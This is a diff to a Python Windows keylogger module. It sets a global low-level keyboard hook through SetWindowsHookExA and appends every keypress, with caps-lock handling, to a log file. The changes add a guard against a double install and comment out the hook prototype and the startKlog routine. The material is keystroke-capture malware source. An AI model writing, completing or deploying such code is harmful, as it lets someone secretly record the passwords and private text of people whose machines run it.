@@ -9,6 +9,7 @@ kernel32 = WinDLL("kernel32", use_last_error=True)
 kernel32.GetModuleHandleW.restype = wintypes.HMODULE
 kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]
 user32.SetWindowsHookExA.argtypes = (c_int, wintypes.HANDLE, wintypes.HMODULE, wintypes.DWORD)
+hooked = None
 
 VK_CODE = {'Cancel':0x03,
            'Backspace':0x08,
@@ -113,6 +114,8 @@ class KeyHook(threading.Thread):
     
     def installHookProc(self,pointer):
         global hooked
+        if(hooked != None):
+            return False
         hooked = self.user32.SetWindowsHookExA(
             WH_KEYBOARD_LL,
             pointer,
@@ -133,8 +136,8 @@ class KeyHook(threading.Thread):
 def hookProc(nCode, wParam, lParam):
     global kh
     global hooked
-    if isStop: 
-        return user32.CallNextHookEx(hooked, nCode, wParam,  lParam)
+    #if isStop: 
+    #    return user32.CallNextHookEx(hooked, nCode, wParam,  lParam)
     if nCode == HC_ACTION and wParam == WM_KEYDOWN:
         fileLog = open(FilLogPath,"a")
         capsLock = user32.GetKeyState(VK_CODE["Caps_lock"])
@@ -225,10 +228,9 @@ def hookProc(nCode, wParam, lParam):
     return user32.CallNextHookEx(hooked, nCode, wParam,  lParam)
 
 
-HOOKPROC = WINFUNCTYPE(c_int, c_int, c_int, POINTER(DWORD))
-hooked = None
-kh = KeyHook()
-
+#HOOKPROC = WINFUNCTYPE(c_int, c_int, c_int, POINTER(DWORD))
+#kh = KeyHook()
+'''
 def startKlog():
     global kh
     pointer = HOOKPROC(hookProc)
@@ -240,4 +242,6 @@ def startKlog():
             kh.unistallHookProc()
             return
     kh.unistallHookProc()
+
+'''
 
